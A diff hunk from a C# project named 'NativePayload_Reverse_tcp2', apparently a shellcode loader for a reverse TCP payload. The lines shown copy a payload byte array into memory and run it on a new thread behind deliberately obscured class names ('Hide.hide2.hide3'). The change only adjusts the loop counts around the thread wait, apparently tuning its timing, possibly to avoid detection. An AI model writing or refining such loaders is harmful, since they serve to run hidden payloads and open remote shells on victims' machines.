@@ -166,9 +166,9 @@ namespace NativePayload_Reverse_tcp2
                 Marshal.Copy(Hide.code.a.ftp, 0, (IntPtr)(Hide.code.b.funcAddr), Hide.code.a.ftp.Length);
                 Hide.hide2.hide3.ops.ht = ct(0, 0, Hide.code.b.funcAddr, Hide.hide2.hide3.ops.pi, 0, ref Hide.hide2.hide3.ops.ti);
                 Hide.hide2.hide3.ops f = new Hide.hide2.hide3.ops();
-                for (int i = 0; i < 600; i++)
+                for (int i = 0; i < 377; i++)
                 {
-                    if (i ==599) 
+                    if (i == 373) 
                     {
                         w(Hide.hide2.hide3.ops.ht, f.f);
                        
